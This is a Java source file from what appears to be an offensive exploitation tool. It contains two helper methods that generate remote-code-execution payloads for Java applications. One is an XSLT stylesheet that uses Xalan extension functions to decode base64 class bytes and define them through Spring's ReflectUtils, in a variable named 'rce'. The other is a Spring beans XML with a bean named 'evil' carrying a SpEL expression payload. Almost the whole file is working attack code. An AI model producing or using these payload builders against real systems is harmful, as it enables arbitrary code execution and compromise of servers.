package cn.butler.thirdparty.payloads.custom;

import cn.butler.thirdparty.payloads.expression.JSExpression;
import cn.butler.thirdparty.payloads.expression.SpelExpression;

import java.util.Base64;

public class FileHandleUtil {
    public static String XSTLModilfyClass(String classByteName,byte[] classByteCode)  {
        String base64ClassByteCode = Base64.getEncoder().encodeToString(classByteCode);
        String fileModifyResult = String.format("<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n" +
            "                xmlns:b64=\"http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\"\n" +
            "                xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"\n" +
            "                xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"\n" +
            "                xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\">\n" +
            " <xsl:template match=\"/\">\n" +
            "     <xsl:variable name=\"bs\" select=\"b64:decodeBuffer(b64:new(),'%s')\"/>\n" +
            "     <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>\n" +
            "     <xsl:variable name=\"rce\" select=\"ru:defineClass('%s',$bs,$cl)\"/>\n" +
            "     <xsl:value-of select=\"$rce\"/>\n" +
            "</xsl:template></xsl:stylesheet>",base64ClassByteCode,classByteName);
        return fileModifyResult;
    }

    public static String ClassPathXmlModilfyClass(String classByteName, byte[] classByteCode) {
        //SPEL-Payload制作
        String code = JSExpression.commonExpressModify(classByteCode);
        String spelPayload = SpelExpression.spelJsCode(code);
        String fileModifyResult = String.format("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
            "       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
            "       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
            "    <bean id=\"evil\" class=\"java.lang.String\">\n" +
            "        <constructor-arg value=\"%s\"/>\n" +
            "    </bean>\n" +
            "</beans>",spelPayload);
        return fileModifyResult;
    }
}
